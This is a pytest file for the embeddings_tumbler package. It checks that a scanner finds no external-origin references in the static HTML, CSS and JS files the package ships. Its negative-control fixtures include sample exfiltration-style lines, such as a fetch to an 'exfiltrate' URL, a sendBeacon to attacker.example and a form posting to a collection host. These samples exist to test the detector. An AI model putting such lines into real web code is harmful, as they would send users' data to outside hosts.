"""Criterion 3 of t14: a scan equivalent to embodiment's check-no-external-origin passes on
every shipped file.

The scanner is ``scripts/check_no_external_origin.py`` (stdlib only; its docstring lists each
rule and whether it was ported from embodiment's ``web/scripts/check-no-external-origin.mjs``
or added here). It runs over what users actually receive: the ``embeddings_tumbler/static/``
files inside a freshly built wheel, the folder ``embeddings-tumbler viewer write`` produces,
and the source tree's static folder. Negative controls prove each rule class bites.

Existing static bans stay where they are (they test other things too): ``tests/test_assemble.py``
bans ``http(s)://``, ``eval``, ``new Function`` and module loading in the core file;
``tests/test_standalone_page.py`` bans scheme URLs, ``@import`` and any ``url(`` in the page
files and checks the page's policy. This scanner is the one check over every shipped file.
"""

from __future__ import annotations

import ast
import importlib.util
import shutil
import subprocess
import sys
import zipfile
from pathlib import Path

import pytest

from embeddings_tumbler.cli import main as cli_main

ROOT = Path(__file__).resolve().parent.parent
SCRIPT = ROOT / "scripts" / "check_no_external_origin.py"
STATIC = ROOT / "embeddings_tumbler" / "static"
SHIPPED = sorted(
    p.name for p in STATIC.iterdir() if p.is_file() and p.suffix not in (".py", ".pyc")
)


def _load():
    spec = importlib.util.spec_from_file_location("check_no_external_origin", SCRIPT)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


scan = _load()


def _run(*args: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        [sys.executable, str(SCRIPT), *args], capture_output=True, text=True, check=False
    )


def _expect_args() -> list[str]:
    return [a for name in SHIPPED for a in ("--expect", name)]


# ----------------------------------------------------------------- every shipped file


@pytest.fixture(scope="module")
def wheel_static(tmp_path_factory) -> Path:
    """The static files from a freshly built wheel, extracted."""
    uv = shutil.which("uv")
    if uv is None:
        pytest.skip("uv is not on PATH, so no wheel can be built here")
    out = tmp_path_factory.mktemp("wheel")
    for extra in (["--offline"], []):
        done = subprocess.run(
            [uv, "build", "--wheel", "--out-dir", str(out), *extra],
            cwd=ROOT,
            capture_output=True,
            text=True,
            check=False,
        )
        if done.returncode == 0:
            break
    assert done.returncode == 0, done.stderr
    (wheel,) = out.glob("*.whl")
    dest = out / "unpacked"
    with zipfile.ZipFile(wheel) as zf:
        members = [m for m in zf.namelist() if m.startswith("embeddings_tumbler/static/")]
        zf.extractall(dest, members)
    return dest / "embeddings_tumbler" / "static"


@pytest.fixture(scope="module")
def written_folder(tmp_path_factory) -> Path:
    folder = tmp_path_factory.mktemp("written")
    assert cli_main(["viewer", "write", str(folder), "--apply"]) == 0
    return folder


def test_shipped_set_is_what_the_scanner_expects():
    assert SHIPPED, "nothing under embeddings_tumbler/static"
    assert "embeddings-tumbler.js" in SHIPPED


def test_every_file_in_the_built_wheel_passes(wheel_static):
    names = sorted(p.name for p in wheel_static.iterdir() if p.suffix not in (".py", ".pyc"))
    assert names == SHIPPED, "the wheel ships a different set from the source tree"
    done = _run(str(wheel_static), *_expect_args())
    assert done.returncode == 0, done.stderr
    assert f"{len(SHIPPED)} file(s) reference no external origin" in done.stdout


def test_every_file_viewer_write_produces_passes(written_folder):
    names = sorted(p.name for p in written_folder.iterdir())
    assert names == SHIPPED
    done = _run(str(written_folder), *_expect_args())
    assert done.returncode == 0, done.stderr


def test_source_static_folder_passes_with_no_arguments():
    done = _run()
    assert done.returncode == 0, done.stderr
    for name in SHIPPED:
        assert name in done.stdout


def test_scanner_is_stdlib_only():
    tree = ast.parse(SCRIPT.read_text(encoding="utf-8"))
    imported = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imported |= {a.name.split(".")[0] for a in node.names}
        elif isinstance(node, ast.ImportFrom) and node.module:
            imported.add(node.module.split(".")[0])
    assert imported - set(sys.stdlib_module_names) - {"__future__"} == set()


# ----------------------------------------------------------------- negative controls

BAD = {
    # rule: (file name, content)
    "H1 script src": ("a.html", '<script src="https://cdn.example.com/lib.js"></script>'),
    "H1 protocol-relative link": ("a.html", '<link rel="stylesheet" href="//fonts.example/css">'),
    "H1 single-quoted": ("a.html", "<img src='http://img.example/x.png'>"),
    "H1 unquoted": ("a.html", "<img src=https://img.example/x.png>"),
    "H2 srcset": ("a.html", '<img src="x.png" srcset="x2.png 2x, https://img.example/x3.png 3x">'),
    "H2 form action": ("a.html", '<form action="https://collect.example/post"></form>'),
    "H2 meta refresh": (
        "a.html",
        '<meta http-equiv="refresh" content="0; url=https://elsewhere.example/">',
    ),
    "H1 websocket scheme (extended)": ("a.html", '<a href="wss://socket.example/feed">x</a>'),
    "H3 inline style": ("a.html", "<style>body{background:url(https://img.example/b.png)}</style>"),
    "H3 style attribute": (
        "a.html",
        '<div style="background:url(//img.example/b.png)"></div>',
    ),
    "H3 inline script": ("a.html", '<script>fetch("https://api.example/x")</script>'),
    "C1 font-face url": ("a.css", "@font-face{src:url(https://fonts.example/f.woff2)}"),
    "C1 protocol-relative url": ("a.css", "body{background:url('//img.example/b.png')}"),
    "C2 import string": ("a.css", '@import "https://fonts.example/css";'),
    "C2 import url": ("a.css", "@import url(//fonts.example/css);"),
    "C3 literal in comment": ("a.css", "/* see https://docs.example/ */ body{}"),
    "J1 fetch https": ("a.js", 'fetch("https://example.com/exfiltrate").then(r=>r.json())'),
    "J1 beacon http": ("a.js", 'const u="http://attacker.example/beacon?x=1";sendBeacon(u)'),
    "J1 websocket": ("a.js", 'new WebSocket("wss://socket.example/feed")'),
    "J1 in a comment": ("a.js", "// docs at https://docs.example/\nconst a = 1;"),
    "J1 spoofed allow-list (J2 is anchored)": (
        "a.js",
        '"https://attacker.example/www.w3.org/2000/svg"',
    ),
    "J3 protocol-relative literal": ("a.js", 'img.src = "//tracker.example/p.gif";'),
    "J3 template literal": ("a.js", "const u = `//cdn.example/${name}.js`;"),
    "J1 unknown text type": ("a.txt", "see http://elsewhere.example/"),
    "B1 font file": ("a.woff2", "wOF2"),
    "B1 not utf-8": ("a.dat", b"\xff\xfe\x00bad"),
}

CLEAN = {
    "relative html": (
        "a.html",
        '<link rel="stylesheet" href="page.css"><script src="embeddings-tumbler.js"></script>'
        '<a href="#top">top</a><img src="/img/x.png"><svg xmlns="http://www.w3.org/2000/svg">'
        "</svg>",
    ),
    "local css": ("a.css", '@font-face{src:url(font.woff2) format("woff2")} @import "base.css";'),
    "js comment slashes": ("a.js", "// a comment\nconst half = a // b;\nconst re = /\\/\\//;"),
    "js w3 namespace": ("a.js", 'document.createElementNS("http://www.w3.org/2000/svg", "svg")'),
}


@pytest.mark.parametrize("rule", list(BAD))
def test_negative_control_bites(rule, tmp_path):
    name, content = BAD[rule]
    path = tmp_path / name
    path.write_bytes(content if isinstance(content, bytes) else content.encode("utf-8"))
    findings = scan.check_file(path)
    assert findings, f"{rule}: the scanner missed it"
    code = rule.split()[0]
    assert any(f"[{code}]" in f for f in findings), findings
    done = _run(str(path))
    assert done.returncode == 1 and code in done.stderr


@pytest.mark.parametrize("case", list(CLEAN))
def test_clean_input_passes(case, tmp_path):
    name, content = CLEAN[case]
    path = tmp_path / name
    path.write_text(content, encoding="utf-8")
    assert scan.check_file(path) == []


def test_a_planted_file_in_a_shipped_folder_fails_the_whole_scan(written_folder, tmp_path):
    folder = tmp_path / "site"
    shutil.copytree(written_folder, folder)
    (folder / "extra.js").write_text('fetch("https://cdn.example/x.js")', encoding="utf-8")
    done = _run(str(folder))
    assert done.returncode == 1 and "extra.js" in done.stderr


def test_set_rules(tmp_path):
    empty = tmp_path / "empty"
    empty.mkdir()
    assert _run(str(empty)).returncode == 1
    (empty / "a.js").write_text("const a = 1;", encoding="utf-8")
    done = _run(str(empty), "--expect", "embeddings-tumbler.js")
    assert done.returncode == 1 and "[S1]" in done.stderr
    assert _run(str(tmp_path / "missing")).returncode == 2
